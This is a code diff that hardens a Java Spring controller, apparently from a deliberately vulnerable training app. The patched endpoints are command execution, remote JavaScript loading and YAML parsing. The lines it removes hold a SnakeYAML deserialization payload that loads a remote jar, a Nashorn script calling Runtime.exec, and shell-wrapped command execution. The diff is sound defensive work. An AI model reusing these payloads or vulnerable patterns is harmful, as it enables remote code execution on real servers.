@@ -16,6 +16,7 @@ import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.sql.DriverManager;
+import java.util.Set;
 
 
 /**
@@ -28,13 +29,23 @@ import java.sql.DriverManager;
 @RequestMapping("/rce")
 public class Rce {
 
+    // Allowlist of safe commands that may be executed
+    private static final Set<String> ALLOWED_COMMANDS = Set.of(
+            "whoami", "hostname", "date", "uptime", "id", "uname"
+    );
+
     @GetMapping("/runtime/exec")
     public String CommandExec(String cmd) {
+        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim().toLowerCase())) {
+            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
+        }
+
         Runtime run = Runtime.getRuntime();
         StringBuilder sb = new StringBuilder();
 
         try {
-            Process p = run.exec(cmd);
+            // Use explicit argv array to avoid shell interpretation
+            Process p = new ProcessBuilder(cmd.trim()).start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
             String tmpStr;
@@ -62,12 +73,15 @@ public class Rce {
      */
     @GetMapping("/ProcessBuilder")
     public String processBuilder(String cmd) {
+        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim().toLowerCase())) {
+            return "Command not allowed. Permitted commands: " + ALLOWED_COMMANDS;
+        }
 
         StringBuilder sb = new StringBuilder();
 
         try {
-            String[] arrCmd = {"/bin/sh", "-c", cmd};
-            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
+            // Use explicit command without shell to prevent injection
+            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
             Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
@@ -87,30 +101,55 @@ public class Rce {
     /**
      * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
      *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
+     * This endpoint no longer evaluates remote scripts. It only accepts
+     * allowlisted script names that map to local safe operations.
      *
-     * @param jsurl js url
+     * @param jsurl script name (must be in allowlist)
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
+    public String jsEngine(String jsurl) throws Exception {
+        // Allowlist of permitted script identifiers — no remote URL evaluation
+        Set<String> allowedScripts = Set.of("hello", "version", "status");
+        if (jsurl == null || !allowedScripts.contains(jsurl.trim().toLowerCase())) {
+            return "Script not allowed. Permitted scripts: " + allowedScripts;
+        }
+
         ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
         Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+        // Remove dangerous Java type access from the engine scope
+        bindings.remove("java");
+        bindings.remove("javax");
+        bindings.remove("Java");
+
+        // Only evaluate safe, hardcoded scripts — never user input
+        String safeScript;
+        switch (jsurl.trim().toLowerCase()) {
+            case "hello":
+                safeScript = "'Hello World'";
+                break;
+            case "version":
+                safeScript = "'1.0.0'";
+                break;
+            case "status":
+                safeScript = "'OK'";
+                break;
+            default:
+                return "Script not allowed.";
+        }
+        Object result = engine.eval(safeScript, bindings);
+        return result != null ? result.toString() : "";
     }
 
 
     /**
-     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
-     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
+     * Safely loads YAML content using SafeConstructor to prevent
+     * deserialization-based code execution.
      *
-     * @param content payloads
+     * @param content YAML content
      */
     @GetMapping("/vuln/yarm")
     public void yarm(String content) {
-        Yaml y = new Yaml();
+        Yaml y = new Yaml(new SafeConstructor());
         y.load(content);
     }
 
